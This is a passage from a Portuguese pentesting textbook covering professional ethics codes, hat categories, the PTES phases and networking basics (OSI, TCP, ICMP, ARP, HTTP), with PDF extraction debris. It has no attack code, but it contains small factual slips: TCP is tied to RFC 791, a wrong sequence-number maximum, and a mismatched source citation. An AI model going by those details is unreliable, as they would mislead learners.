seu trabalho. A maioria das organizações definem essas expectativas através de códigos de conduta, códigos de ética e declarações de conduta. No caso de testes de penetração, trata-se de fazer as escolhas certas, já que usamos poderosas ferramentas que podem fornecer acesso não autorizado, negar serviços e, possivelmente, destruir dados. Você, sem dúvida, encontrará vários dilemas que irão exigir que considere o código ético e seu raciocínio moral, apesar das suas ações. Além disso, contra as consequências, após a discussão, você deve ter as 24<br /> <br /> ferramentas certas para tomar a melhor decisão. Todas as nossas ferramentas de pentest podem ser usadas para fortalecer a segurança e a resiliência dos sistemas, mas, de fato, em mão erradas ou quando usadas com más intenções, podem comprometer sistemas e obter acesso não autorizado em dados confidenciais. Embora você queira fazer o uso dessas ferramentas, deve se lembrar de que o objetivo do pentest é o de melhorar a segurança do sistema e da organização por meio das atividades. A execução de exploits e acesso a esses recursos em sistemas que demonstram vulnerabilidades podem ser corrigidos quando a extensão do problema é conhecida e compartilhada com aqueles que podem corrigi-las. Porém, se essa informação nunca chega a alguém em uma organização e se a vulnerabilidade nunca for compartilhada com o fornecedor original do software, essas questões não serão corrigidas. Como profissionais de penetração, temos obrigações éticas e contratuais, de maneira que precisamos nos assegurar de que operamos de uma forma que não viole esses códigos e não corrompa a confiança dessa profissão. Para isso, é importante que você tenha o entendimento das suas ações. Para que possa entender o que é necessário para realizar testes de penetração, é importante entender o código de 25<br /> <br /> conduta e ética nesta área de profissão. Há muito mais para saber a respeito desse tema além do que será que descrito neste livro; isto é apenas o começo, a indicação do caminho por onde ir. Para realizar os testes descritos neste livro, é necessário que você os faça em um ambiente de teste que você tenha o controle de forma legal, para que possa se divertir e aplicar todo o conhecimento disponível sem causar danos reais a uma empresa ou pessoa física. Precisamos operar profissionalmente, assegurando que temos o conhecimento e consentimento das partes interessadas para realizar os testes, de forma que nós não devemos realizar testes além do escopo do projeto, ao menos que esteja autorizado fazê-lo. Sendo assim, gerencie todos os projetos com eficiência e proteja qualquer propriedade intelectual confiada a você. Divulgue responsavelmente compartilhando suas descobertas com as partes interessadas apropriadas em tempo hábil, nunca tome decisões sozinho, sempre trabalhe em equipe e comunique a quem esta informação de fato pertence e às partes interessadas. Não subestime o risco, sempre que você avaliar um risco, não avance, pois pode causar problemas em alguma estrutura. Conheça a diferença entre não divulgação, divulgação completa, divulgação responsável ou coordenada. 26<br /> <br /> Avance na profissão, compartilhe seu conhecimento com profissionais pentesters e profissionais de segurança. Técnicas de ferramentas em testes de penetração em paralelo com a tecnologia estão evoluindo continuamente, então trabalhar sempre para avançar esse campo, compartilhando a informação, é essencial para o crescimento profissional. Use todas as ferramentas apresentadas neste livro com responsabilidade, pois de fato são ferramentas poderosas.<br /> <br /> 5.1.<br /> <br /> EC-Council – Código de ética<br /> <br /> Através do programa de certificação Ethical Hacker, CEH, o membro estará vinculado a este código de ética, o qual é voltado para profissionais de pentest. A versão atual deste código pode ser encontrada no site: https://www.eccouncil.org/code-of-ethics<br /> <br /> Veja alguns dos principais pontos deste código de ética:<br /> <br /> (01)<br /> <br /> Privacidade<br /> <br /> Mantenha informações privadas e confidenciais obtidas em seu trabalho profissional (em particular no que se refere às listas de clientes e informações pessoais do cliente). Não colete, dê, venda ou transfira qualquer informação pessoal (como nome, endereço de e-mail, 27<br /> <br /> número da Segurança Social ou outro identificador exclusivo) a um terceiro sem o consentimento prévio do cliente. (02)<br /> <br /> Propriedade Intelectual<br /> <br /> Proteja a propriedade intelectual de outras pessoas confiando em sua própria inovação e esforços, garantindo, assim, que todos os benefícios sejam adquiridos com o seu originador. (03)<br /> <br /> Divulgação<br /> <br /> Divulgar às pessoas ou autoridades adequadas a respeito de perigos potenciais para qualquer cliente de comércio eletrônico. Esses perigos podem incluir comunidade da Internet ou o público que você acredita razoavelmente estar associado a um determinado conjunto ou tipo de transações eletrônicas, software ou hardware relacionado. (04)<br /> <br /> Área de expertise<br /> <br /> Fornecer serviços nas suas áreas de competência, ser honesto e direto sobre quaisquer limitações de sua experiência e educação. Certifique-se de que você é qualificado para qualquer projeto no qual você trabalha ou se propõe a trabalhar por uma combinação adequada de educação, treinamento e experiência. (05)<br /> <br /> Uso não autorizado 28<br /> <br /> Nunca, conscientemente, use software ou processo que seja obtido ou retido de forma ilegal ou não ética. (06)<br /> <br /> Atividade Ilegal<br /> <br /> Não se envolver em práticas financeiras enganosas, como suborno, cobrança dupla ou outras práticas financeiras impróprias. (07)<br /> <br /> Autorização<br /> <br /> Use a propriedade de um cliente ou empregador somente de maneiras adequadamente autorizadas, e com o conhecimento e consentimento do proprietário. (08)<br /> <br /> Gerenciamento<br /> <br /> Assegurar uma boa gestão de qualquer projeto que você liderar, incluindo procedimentos efetivos para promoção de qualidade e divulgação completa de risco. (09)<br /> <br /> Compartilhamento de conhecimento<br /> <br /> Adicione ao conhecimento da profissão de comércio eletrônico por estudo constante, compartilhe as lições de sua experiência com outros membros do Conselho da CE e promova a conscientização pública sobre os benefícios do comércio eletrônico. *Fonte: https://www.eccouncil.org/code-ofethics<br /> <br /> 2. (ISC)! – Código de ética 29<br /> <br /> O código de ética da (ISC)! aplica-se a membros desta organização e titulares de certificação como o CISSP, Certified Information Systems Security Professional. Embora este código não seja projetado especificamente para testes de penetração, eles são extremamente simples e têm um conteúdo abrangente para cobrir a maioria das questões éticas que você irá encontrar como profissional de segurança da informação. Verifique o código completo no site: https://www.isc2.org/ethics<br /> <br /> Veja alguns dos principais pontos deste código de ética:<br /> <br /> (01) Proteger a sociedade, a comunidade e a infraestrutura. (02) A g i r c o m h o n r a , h o n e s t i d a d e , j u s t i ç a , responsabilidade e legalidade. (03) Prover um serviço diligente e competente aos diretores. (04)<br /> <br /> Avançar e proteger a profissão.<br /> <br /> 5.2.<br /> <br /> De que lado?<br /> <br /> 30<br /> <br /> Há uma discussão na área sobre qual chapéu um profissional da segurança está usando, ou seja, de que lado moral o profissional age com o conhecimento de técnicas de penetração. Normalmente, são definidos em White Hat, Black Hat e Grey Hat. Fonte: Videoaula TDI – Bootcamp – Ética e código de conduta<br /> <br /> WHITE HAT: Os hackers WHITE HAT optam por usar seus poderes para o bem. Também conhecidos como "hackers éticos", estes às vezes podem ser empregados pagos ou contratados trabalhando para empresas como especialistas em segurança que tentam encontrar buracos de segurança através de técnicas de invasão. Os WHITE HAT empregam os mesmos métodos de hacking que os BLACK HAT, com uma exceção - eles fazem isso com a permissão do proprietário do sistema, o que torna o processo completamente legal. Os hackers WHITE HAT realizam testes de penetração, testam os sistemas de segurança no local e realizam avaliações de vulnerabilidade para as empresas. 31<br /> <br /> BLACK HAT: Como todos os hackers, os BLACK HAT geralmente têm um amplo conhecimento sobre a invasão de redes de computadores e a ignorância de protocolos de segurança. Eles também são responsáveis por escreverem malwares, que é um método usado para obter acesso a esses sistemas. Sua principal motivação é, geralmente, para ganhos pessoais ou financeiros, mas eles também podem estar envolvidos em espionagem cibernética, hacktivismo ou talvez sejam apenas viciados na emoção do cibercrime. Os BLACK HAT podem variar de amadores, ao espalhar malwares, a hackers experientes que visam roubar dados, especificamente informações financeiras, informações pessoais e credenciais de login. Eles não só procuram roubar dados, mas também procuram modificar ou destruir dados. GREY HAT: Como na vida, há áreas cinzentas que não são nem preto nem branco. Os hackers GREY HAT são uma mistura de atividades de BLACK HAT e WHITE HAT. Muitas vezes os hackers GREY HAT procurarão vulnerabilidades em um sistema sem a permissão ou o conhecimento do proprietário. Se os problemas forem encontrados, eles os denunciarão ao proprietário, às vezes solicitando uma pequena taxa para corrigir o problema. Se o proprietário não responde ou cumpre, 32<br /> <br /> as vezes os hackers GREY HAT publicarão a descoberta recentemente encontrada online para o mundo ver. Esses tipos de hackers não são inerentemente maliciosos com suas intenções, eles estão procurando tirar algum proveito de suas descobertas por si mesmos. Geralmente, esses hackers não vão explorar as vulnerabilidades encontradas. No entanto, esse tipo de hacking ainda é considerado ilegal, porque o hacker não recebeu permissão do proprietário antes de tentar atacar o sistema. Embora a palavra hacker tenda a evocar conotações negativas quando referida, é importante lembrar que todos os hackers não são criados de forma igual. Se não tivéssemos hackers WHITE HAT procurando diligentemente ameaças e vulnerabilidades antes que os BLACK HAT pudessem encontrá-las, provavelmente haveria muito mais atividade envolvendo cibercriminosos explorando vulnerabilidades e coletando dados confidenciais do que existe agora. Fonte: https://community.norton.com/en/blogs/norton-protection-blog/whatdifference-between-black-white-and-grey-hat-hackers<br /> <br /> 6.<br /> <br /> O Processo de Penetration Test<br /> <br /> Alguns anos atrás, para realizar o processo de pentest não existia nenhum padrão, fazendo com que quando os processos não fossem bem organizados não atingissem os objetivos propostos, devido ao descuido 33<br /> <br /> nos resultados, má documentação e má organização de relatórios. Foi criado um padrão por profissionais experientes para solucionar estes problemas, o qual se chama PTES, Pentest Standard. Ele possui sete sessões organizadas em um cronograma de engajamento. Essas sessões cobrem um cronograma aproximado para o pentest do início ao fim. Ele inicia-se com o trabalho que começa antes de utilizar o Metasploit durante todo o caminho, até a entrega do relatório para o cliente, de forma consistente.<br /> <br /> Sessões PTES: (01)<br /> <br /> Interações de pré-engajamento<br /> <br /> Envolvem o levantamento de pré-requisitos para o início do pentest, definem o escopo do processo de teste e desenvolvem as regras. (02)<br /> <br /> Coleta de informações<br /> <br /> É a atividade associada à descoberta de mais informações sobre o cliente. Essas informações são úteis para fases posteriores do teste. (03)<br /> <br /> Modelamento de ameaças<br /> <br /> A modelagem de ameaças utiliza a informação dos ativos e processos de negócio reunidos sobre o cliente para analisar o cenário de ameaças. 34<br /> <br /> É importante que as informações de ativos sejam usadas para determinar os sistemas a serem direcionados para o teste, e as informações de processos sejam utilizadas para determinar como atacar esses sistemas. Com base nas informações de destino, as ameaças e os agentes de ameaças podem ser identificados e mapeados para as informações de ativos. O resultado é o modelo de ameaças que uma organização é suscetível de enfrentar. (04)<br /> <br /> Análise de vulnerabilidades<br /> <br /> Envolve a descoberta de falhas e fraquezas. Através de uma variedade de métodos e ferramentas de teste, você obterá informações sobre os sistemas em uso e suas vulnerabilidades. (05)<br /> <br /> Exploração<br /> <br /> Usando as informações de vulnerabilidades e o levantamento de requisitos realizados anteriormente, é nesta etapa que exploramos de fato as vulnerabilidades para obter acesso aos destinos. Alguns sistemas têm controle de segurança que temos que ignorar, desativar ou evitar, e às vezes temos que tomar uma rota completamente diferente para realizar a meta. (06)<br /> <br /> Pós-Exploração<br /> <br /> Uma vez que conseguimos o acesso a um sistema precisamos determinar se ele tem algum valor para o 35<br /> <br /> nosso propósito e precisamos manter o controle sobre o sistema. A fase pós-exploração explora estas técnicas. (07)<br /> <br /> Relatórios<br /> <br /> É necessário documentar o nosso trabalho e apresentar ao cliente em forma de um relatório que apoie o cliente a melhorar sua postura de segurança descoberta durante o teste. Para mais informações acesse o site oficial do PTES: http://www.pentest-standard.org<br /> <br /> Além dos PTES, temos que ter ciência de outras metodologias de teste. O Instituto Nacional de Padrões e Tecnologias, NIST, produz uma série de publicações relacionadas à segurança conhecida coletivamente como NIST 800-115, um guia técnico para teste de validação de segurança da informação, que foi publicado em 2008 e tem apenas uma pequena sessão específica sobre testes de penetração. O Open Source Security Testing Methodology, OSSTMM, possui um manual que foi publicado em 2010. Atualmente, há uma 4ª edição em desenvolvimento, porém para ter acesso a este manual é necessário ser membro, o que envolve a realização de alguns cursos e um programa de certificação de três níveis para esta metodologia. 36<br /> <br /> O Open Web Application Security Project ,<br /> <br /> OWASP, também possui um guia, o OWASP Testing Guide v4, e seu foco principal está em testes de segurança de aplicativos web, mas tem um valor de grande peso em testes de penetração. Fonte: Videoaula TDI – Bootcamp – O Processo de Penetration Test<br /> <br /> 37<br /> <br /> Chapter 02<br /> <br /> 38<br /> <br /> 2. CONCEITOS BÁSICOS DE REDE<br /> <br /> UNIDADE 02<br /> <br /> Uma rede consiste em dois ou mais computadores ligados entre si e compartilhando dados, dentre outros recursos, como compartilhamento de impressoras e comunicação. As redes podem ser classificadas de acordo com sua extensão geográfica, pelo padrão, topologia ou meio de transmissão. 1.<br /> <br /> Extensão geográfica<br /> <br /> SAN Storage area network: São usadas para armazenamento de arquivos. Ex.: backups, servidores de arquivos etc. LAN Local area network: São redes de alcance local, as quais podem ser redes internas de curto alcance ou redes que alcançam uma área mais elevada. Seu alcance máximo é de aproximadamente 10 km. PAN Personal area network: São redes pessoais como bluetooth. MAN Metropolitan area network: São redes que interligam regiões metropolitanas. Hoje em dia podem até serem confundidas com LANS devido à evolução das mesmas.<br /> <br /> 39<br /> <br /> WAN Wide area network: São redes de grande extensão que podem interligar redes independentes, portanto é uma rede de alcance mundial. A internet é o melhor exemplo de WAN. 2.<br /> <br /> Topologia<br /> <br /> Rede em anel Todos os computadores são ligados a um único cabo que passa por todos eles. Um sinal circula por toda a rede e o micro que quer transmitir pega carona no sinal e transmite para o destino. Se um computador pára de se comunicar, todos os outros param também. Rede em barramento Todos os computadores são ligados em uma única “barra”, um cabo que recebe todos os outros e faz a transmissão dos dados. Se um dos computadores para todos os outros param também. Rede em estrela Essa topologia é a mais usada no momento, pois é a mais eficiente. Todos os computadores são ligados a um concentrador e a facilidade de adicionar e retirar pontos a qualquer momento faz dessa topologia a mais popular. Se um computador perde a conexão, apenas ele não se comunica, não afetando o resto da rede. Rede em malha 40<br /> <br /> É aquela em que se juntam mais de um dos tipos anteriores em uma única rede, atualmente usado para redundância. 3. ! ! ! ! ! ! !<br /> <br /> Rede Rede Rede Rede Rede Rede Rede 4.<br /> <br /> Meios de transmissão de Cabo coaxial; de Cabo de fibra óptica; de Cabo de par trançado (UTP e STP); sem fios; por infravermelhos; por micro-ondas; por rádio. Compartilhamento de dados<br /> <br /> Cliente / servidor Arquivos concentrados em um único servidor e as estações têm acesso ao servidor para buscar arquivos. Peer to peer São redes “ponto a ponto” em que os computadores se conectam uns aos outros para fazer o compartilhamento dos arquivos. 5.<br /> <br /> Tipos de servidores<br /> <br /> Servidor de Arquivos Realiza o armazenamento, transferência e o backup dos arquivos. Servidor de Impressão Gerencia impressoras, fila de impressão e spool. 41<br /> <br /> Servidor de Mensagens Gerencia e-mails, mensagens ponto a ponto e conferências de áudio e vídeo. Servidor de Aplicação Permite que aplicativos sejam executados remotamente. Servidor de Comunicação Redireciona as requisições de comunicação. 6.<br /> <br /> Componentes de uma rede<br /> <br /> Servidor Oferta recursos e serviços. Cliente Equipamento ou software que busca por serviços. Estação de trabalho Busca recursos no servidor para produtividade pessoal. Nó Ponto da rede. Cabeamento Estrutura física organizada para oferecer suporte físico à transmissão dos dados. Placa de rede Oferece a conexão do computador com a rede. Hardware de rede (Ativos e passivos) ! Hub ! Switch 42<br /> <br /> ! ! ! ! 7.<br /> <br /> Roteador Gateway Firewall Transceiver Comunicação de dados<br /> <br /> Transmissão Para que haja transmissão, é necessário que exista um transmissor, um receptor, um meio e um sinal. Modos de operação: Simplex Apenas um canal de comunicação, a qual ocorre em apenas um sentido. Half-Duplex Comunicação bidirecional, mas não simultânea. Full-Duplex Comunicação bidirecional e simultânea. 8.<br /> <br /> Informações analógicas e digitais<br /> <br /> Analógicas Variam linearmente com o tempo e podem assumir valores infinitos dentro dos limites impostos. Digitais São discretas, variam apenas entre 0 e 1. 9.<br /> <br /> Transmissão em série e paralelo<br /> <br /> Paralelo Vários bytes por vez, cabos curtos, muita interferência, rápida. 43<br /> <br /> Série Cabos mais longos, menos interferência, apenas um cabo de comunicação. 10.<br /> <br /> Transmissão quanto ao sincronismo<br /> <br /> Síncrona Um único bloco de informações é transmitido com caracteres de controle e sincronismo. Assíncrona Os bytes são transmitidos com bytes de início e fim. Não há uma cadência na transmissão. É conhecida também como transmissão start stop.<br /> <br /> 11.<br /> <br /> Protocolos<br /> <br /> São como linguagens usadas para fazer a comunicação entre estações de trabalho e os servidores. São regras que garantem a troca de dados entre transmissor e receptor. Características Funcionar em half-duplex, compartilhar um mesmo meio, exigir sincronismo para comunicar, pode sofrer interferência e ocorrência de falhas. Tipos de protocolos O mais importante é o protocolo TCP/IP, mas também são utilizados o NetBeui e o IPX/SPX. 44<br /> <br /> 12.<br /> <br /> O modelo OSI<br /> <br /> O modelo OSI, Open Systems Interconnection, foi lançado em 1984 pela International Organization for Standardization. Trata-se de uma arquitetura modelo que divide as redes de computadores em 7 camadas para obter camadas de abstração. Cada protocolo realiza a inserção de uma funcionalidade assinalada a uma camada específica. U t i l i z a n d o o M o d e l o O S I é p o s s í ve l r e a l i z a r comunicação entre máquinas distintas e definir diretivas genéricas para a elaboração de redes de computadores independente da tecnologia utilizada, sejam essas redes de curta, média ou longa distância. Esse modelo exige o cumprimento de etapas para atingir a compatibilidade, portabilidade, interoperabilidade e escalabilidade. São elas: a definição do modelo, a definição dos protocolos de camada e a seleção de perfis funcionais. A primeira delas define o que a camada realmente deve fazer. A segunda faz a definição dos componentes que fazem parte do modelo, enquanto a terceira é realizada pelos órgãos de padronização de cada país. O Modelo OSI é composto por 7 camadas, sendo que cada uma delas realizam determinadas funções. As camadas são:<br /> <br /> Aplicação – Application: 45<br /> <br /> A camada de aplicativo serve como a janela onde os processos de aplicativos e usuários podem acessar serviços de rede. Essa camada contém uma variedade de funções normalmente necessárias. Apresentação - Presentation: A camada de apresentação formata os dados a serem apresentados na camada de aplicativo. Ela pode ser considerada o tradutor da rede. Essa camada pode converter dados de um formato usado pela camada de aplicativo em um formato comum na estação de envio e, em seguida, converter esse formato comum em um formato conhecido pela camada de aplicativo na estação de recepção. Sessão - Session: A camada de sessão permite o estabelecimento da sessão entre processos em execução em estações diferentes. Transporte - Transport: A camada de transporte garante que as mensagens sejam entregues sem erros, em sequência e sem perdas ou duplicações. Ela elimina para os protocolos de camadas superiores qualquer preocupação a respeito da transferência de dados entre eles e seus pares. Rede - Network: A camada de rede controla a operação da sub-rede, decidindo que caminho físico os dados devem seguir com base nas condições da rede, na prioridade do serviço e em outros fatores. Dados - Data Link: 46<br /> <br /> A camada de vínculo de dados proporciona uma transferência de quadros de dados sem erros de um nó para outro através da camada física, permitindo que as camadas acima dela assumam a transmissão praticamente sem erros através do vínculo. Física - Physical: A camada física, a camada inferior do modelo OSI, está encarregada da transmissão e recepção do fluxo de bits brutos não estruturados através de um meio físico. Ela descreve as interfaces eléctricas/ópticas, mecânicas e funcionais com o meio físico e transporta os sinais para todas as camadas superiores. Veja uma tabela de comparação do modelo OSI e o TCP/IP e seus respectivos protocolos e serviços:<br /> <br /> 13.<br /> <br /> TCP - Transmission Control Protocol 47<br /> <br /> O TCP (Protocolo de controle de transmissão) é um dos protocolos sob os quais a Internet se assenta. Ele é complementado pelo Protocolo da Internet, sendo normalmente chamado de TCP/IP. A versatilidade e robustez do TCP tornou-o adequado a redes globais, já que esse verifica se os dados são enviados de forma correta, na sequência apropriada e sem erros, pela rede. O TCP é um protocolo de nível da camada de transporte (camada 4) do Modelo OSI e é sobre o qual que se assentam a maioria das aplicações cibernéticas, como o SSH, FTP, HTTP — portanto, a World Wide Web. O Protocolo de controle de transmissão provê confiabilidade, entrega na sequência correta e verificação de erros em pacotes de dados, entre os diferentes nós da rede, para a camada de aplicação. Aplicações que não requerem um serviço de confiabilidade de entrega de pacotes podem se utilizar de protocolos mais simples como o User Datagram Protocol (UDP), que provê um serviço que enfatiza a redução de latência da conexão. Cabeçalho de uma trama TCP + 0<br /> <br /> Bits 0 3<br /> <br /> 10 15<br /> <br /> 4-9<br /> <br /> Porta na origem<br /> <br /> 16 – 31 Porta no destino<br /> <br /> 32<br /> <br /> Número de sequência<br /> <br /> 64<br /> <br /> Número de confirmação (ACK)<br /> <br /> 96<br /> <br /> Offset<br /> <br /> Reserva dos<br /> <br /> Flags<br /> <br /> Janela Window<br /> <br /> 48<br /> <br /> 12 8<br /> <br /> Ponteiro de urgência<br /> <br /> Checksum<br /> <br /> 16 0<br /> <br /> Opções (opcional)<br /> <br /> Padding (até 32) 22 4<br /> <br /> + 96<br /> <br /> Dados<br /> <br /> Detalhe do campo Flags 10 11 12 13 14 UrgPtr ACK Push RST SYN<br /> <br /> 15 FIN<br /> <br /> Funcionamento do protocolo O protocolo TCP especifica três fases durante uma conexão: estabelecimento da ligação, transferência e término de ligação. O estabelecimento é feito em três passos, enquanto o término é feito em quatro. Durante a inicialização, são inicializados alguns parâmetros, como o Sequence Number (número de sequência), para garantir a entrega ordenada e a robustez durante a transferência. Estabelecimento da conexão Para estabelecer uma conexão, o TCP usa um handshake (aperto de mão) de três vias. Antes que o cliente tente se conectar com o servidor, o servidor deve primeiro ligar e escutar a sua própria porta, para só depois abri-la para conexões: isto é chamado de abertura passiva. Uma vez que a abertura passiva 49<br /> <br /> esteja estabelecida, um cliente pode iniciar uma abertura ativa. Para estabelecer uma conexão, o aperto de mão de três vias (ou três etapas) é realizado: SYN: A abertura ativa é realizada por meio do envio de um SYN pelo cliente ao servidor. O cliente define o número de sequência de segmento como um valor aleatório A. SYN-ACK: Em resposta, o servidor responde com um SYN-ACK. O número de reconhecimento (acknowledgment) é definido como sendo um a mais que o número de sequência recebido, i.e. A+1, e o número de sequência que o servidor escolhe para o pacote é outro número aleatório B. ACK: Finalmente, o cliente envia um ACK de volta ao servidor. O número de sequência é definido ao valor de reconhecimento recebido, i.e. A+1, e o número de reconhecimento é definido como um a mais que o número de sequência recebido, ex.: B+1. Neste ponto, o cliente e o servidor receberam um reconhecimento de conexão. As etapas 1 e 2 estabelecem o parâmetro (número de sequência) de conexão para uma direção e ele é reconhecido. As etapas 2 e 3 estabelecem o parâmetro de conexão (número de sequência) para a outra direção e ele é reconhecido. Com isso, uma comunicação full-duplex é estabelecida. Tipicamente, numa ligação TCP existe aquele designado de servidor (que abre um socket e espera passivamente por ligações) num extremo, e o cliente no outro. O cliente inicia a ligação enviando um pacote 50<br /> <br /> TCP com a flag SYN ativa e espera-se que o servidor aceite a ligação enviando um pacote SYN+ACK. Se, durante um determinado espaço de tempo, esse pacote não for recebido, ocorre um timeout e o pacote SYN é reenviado. O estabelecimento da ligação é concluído por parte do cliente, confirmando a aceitação do servidor respondendo-lhe com um pacote ACK. Durante essas trocas, são trocados números de sequência iniciais (ISN) entre os interlocutores que irão servir para identificar os dados ao longo do fluxo, bem como servir de contador de bytes transmitidos durante a fase de transferência de dados (sessão). No final desta fase, o servidor inscreve o cliente como uma ligação estabelecida numa tabela própria que contém um limite de conexões, o backlog. No caso de o backlog ficar completamente preenchido a ligação é rejeitada, ignorando (silenciosamente) todos os subsequentes pacotes SYN.<br /> <br /> 51<br /> <br /> Transferência de dados (sessão) Durante a fase de transferência, o TCP está equipado com vários mecanismos que asseguram a confiabilidade e robustez: números de sequência que garantem a entrega ordenada, código detector de erros (checksum) para detecção de falhas em segmentos específicos, confirmação de recepção e temporizadores que permitem o ajuste e contorno de eventuais atrasos e perdas de segmentos. Como se pode observar pelo cabeçalho TCP, existem permanentemente um par de números de sequência, doravante referidos como número de sequência e número de confirmação (acknowledgment). O emissor determina o seu próprio número de sequência e o receptor confirma o segmento usando como número ACK o número de sequência do emissor. Para manter a confiabilidade, o receptor confirma os segmentos indicando que recebeu um determinado número de bytes contíguos. Uma das melhorias introduzidas no TCP foi a possibilidade de o receptor confirmar blocos fora da ordem esperada. Essa característica designa-se por selective ACK, ou apenas SACK. A remontagem ordenada dos segmentos é feita usando os números de sequência, de 32 bit, que reiniciam a zero quando ultrapassam o valor máximo, 231-1, tomando o valor da diferença. Assim, a escolha do ISN torna-se vital para a robustez deste protocolo. O campo checksum permite assegurar a integridade do segmento. Ele é expresso em complemento para um, consistindo na soma dos valores (em complemento para um) da trama. A escolha da operação de soma em complemento para um deve-se ao fato de essa poder ser calculada da mesma forma para múltiplos deste comprimento - 16 bit, 32 bit, 64 bit etc - e o 52<br /> <br /> resultado, quando encapsulado, será o mesmo. A verificação desse campo por parte do receptor é feita com a recomputação da soma em complemento para um que dará -0 caso o pacote tenha sido recebido intacto. Esta técnica (checksum), embora muito inferior a outros métodos detectores, como o CRC, é parcialmente compensada com a aplicação do CRC ou outros testes de integridade melhores ao nível da camada 2, logo abaixo do TCP, como no caso do PPP e Ethernet. Contudo, isso não torna este campo redundante: com efeito, estudos de tráfego revelam que a introdução de erro é bastante frequente entre hops protegidos por CRC e que esse campo detecta a maioria desses erros. As confirmações de recepção (ACK) servem também ao emissor para determinar as condições da rede. Dotados de temporizadores, tanto os emissores como receptores podem alterar o fluxo dos dados, contornar eventuais problemas de congestão e, em alguns casos, prevenir o congestionamento da rede. O protocolo está dotado de mecanismos para obter o máximo de performance da rede sem a congestionar — o envio de tramas por um emissor mais rápido que qualquer um dos intermediários (hops) ou mesmo do receptor pode inutilizar a rede. São exemplo a janela deslizante e o algoritmo de início-lento. Adequação de parâmetros O cabeçalho TCP possui um parâmetro que permite indicar o espaço livre atual do receptor (emissor quando envia a indicação): a janela (ou window). Assim, o emissor fica a saber que só poderá ter em trânsito aquela quantidade de informação até esperar 53<br /> <br /> pela confirmação (ACK) de um dos pacotes - que por sua vez trará, com certeza, uma atualização da janela. Curiosamente, a pilha TCP no Windows foi concebida para se auto ajustar na maioria dos ambientes e, nas versões atuais, o valor padrão é superior em comparação com versões mais antigas. Porém, devido ao tamanho do campo, que não pode ser expandido, os limites aparentes da janela variam entre 2 e 65535, o que é bastante pouco em redes de alto débito e hardware de alta performance. Para contornar essa limitação é usada uma opção especial que permite obter múltiplos do valor da janela, chamado de escala da janela, ou TCP window scale; este valor indica quantas vezes o valor da janela, de 16 bit, deve ser operado por deslocamento de bits (para a esquerda) para obter os múltiplos, podendo variar entre 0 e 14. Assim, torna-se possível obter janelas de 1 gigabyte. O parâmetro de escala é definido unicamente durante o estabelecimento da ligação.<br /> <br /> 54<br /> <br /> Término da ligação A fase de encerramento da sessão TCP é um processo de quatro fases, em que cada interlocutor se responsabiliza pelo encerramento do seu lado da ligação. Quando um deles pretende finalizar a sessão, envia um pacote com a flag FIN ativa, ao qual deverá receber uma resposta ACK. Por sua vez, o outro interlocutor irá proceder da mesma forma, enviando um FIN ao qual deverá ser respondido um ACK. Pode ocorrer, no entanto, que um dos lados não encerre a sessão. Chama-se a esse tipo de evento de conexão semiaberta. O lado que não encerrou a sessão poderá continuar a enviar informação pela conexão, mas o outro lado não.<br /> <br /> Observação: 55<br /> <br /> (1)<br /> <br /> Para saber mais sobre o protocolo TCP/IP verifique a RFC 791. https://tools.ietf.org/html/rfc791<br /> <br /> Um Request for Comments (RFC) é um tipo de publicação da Internet Engineering Task Force (IETF) e da Internet Society (ISOC), o principal desenvolvimento técnico e padrões de organismos para a Internet. Fonte: https://pt.wikipedia.org/wiki/Transmission_Control_Protocol<br /> <br /> 14.<br /> <br /> ICMP – Internet Control Message Protocol<br /> <br /> É um protocolo integrante do Protocolo IP, definido pelo RFC 792. Ele permite gerenciar as informações relativas aos erros nas máquinas conectadas. Devido aos poucos controles que o protocolo IP realiza, ele não corrige esses erros, mas os mostra para os protocolos das camadas vizinhas. Assim, o protocolo ICMP é usado por todos os roteadores para assinalar um erro, chamado de Delivery Problem. As mensagens ICMP geralmente são enviadas automaticamente em uma das seguintes situações: ! ! !<br /> <br /> Um pacote IP não consegue chegar ao seu destino (i.e. Tempo de vida do pacote expirado); O Gateway não consegue retransmitir os pacotes na frequência adequada (i.e. Gateway congestionado); O Roteador ou Encaminhador indica uma rota melhor para a máquina a enviar pacotes.<br /> <br /> Mensagem ICMP encapsulada num datagrama IP: 56<br /> <br /> Títul o<br /> <br /> Mensagem ICMP Tipo (8 bits) Código (8 bits) Checksum (16 bits) Mensagem (dimensão variável)<br /> <br /> Fonte: https://pt.wikipedia.org/wiki/Internet_Control_Message_Protocol<br /> <br /> 57<br /> <br /> 15.<br /> <br /> ARP – Address Resolution Protocol<br /> <br /> O Address Resolution Protocol é um protocolo de telecomunicações usado para resolução de endereços da camada de Internet em endereços da camada de enlace, uma função crítica em redes de múltiplos acessos. O ARP foi definido pela RFC 826 em 1982 e o Padrão Internet STD 37, também é o nome do programa para manipulação desses endereços na maioria dos sistemas operacionais. O ARP é usado para mapear um endereço de rede, por exemplo, um endereço IPv4, para um endereço físico como um endereço Ethernet, também chamado de endereço MAC. ARP foi implementado com muitas combinações de tecnologias da camada de rede e de enlace de dados. Em redes Internet Protocol Version 6 (IPv6), a funcionalidade do ARP é fornecida pelo Neighbor Discovery Protocol (NDP). Funcionamento do ARP O Address Resolution Protocol é um protocolo de requisição e resposta que é executado encapsulado pelo protocolo da linha. Ele é comunicado dentro dos limites de uma única rede, nunca roteado entre nós de redes. Essa propriedade coloca o ARP na camada de enlace do conjunto de protocolos da Internet, enquanto no modelo Open Systems Interconnection (OSI) ele é frequentemente descrito como residindo na Camada 3, sendo encapsulado pelos protocolos da Camada 2. 58<br /> <br /> Entretanto, o ARP não foi desenvolvido no framework OSI. 16.<br /> <br /> HTTP – HyperText Transfer Protocol<br /> <br /> O Hypertext Transfer Protocol é um protocolo de comunicação, na camada de aplicação segundo o Modelo OSI, utilizado para sistemas de informação de hipermídia, distribuídos e colaborativos. Ele é a base para a comunicação de dados da World Wide Web. O HTTP funciona como um protocolo de requisiçãoresposta no modelo computacional cliente-servidor. Um navegador web, por exemplo, pode ser o cliente e uma aplicação em um computador que hospeda um sítio da web pode ser o servidor. O cliente submete uma mensagem de requisição HTTP para o servidor. O servidor, que fornece os recursos, como arquivos HTML e outros conteúdos, ou realiza outras funções de interesse do cliente, retorna uma mensagem r e s p o s t a p a ra o c l i e n t e . A r e s p o s t a c o n t é m informações de estado completas sobre a requisição e pode também conter o conteúdo solicitado no corpo de sua mensagem. Um navegador web é um exemplo de agente de usuário (AU). Outros tipos de agentes de usuário incluem o software de indexação usado por provedores de consulta (web crawler), navegadores vocais, aplicações móveis e outros softwares que acessam, consomem ou exibem conteúdo web. Fonte: https://pt.wikipedia.org/wiki/Internet_Control_Message_Protocol<br /> <br /> 17.<br /> <br /> DNS - Domain Name System<br /> <br /> 59<br 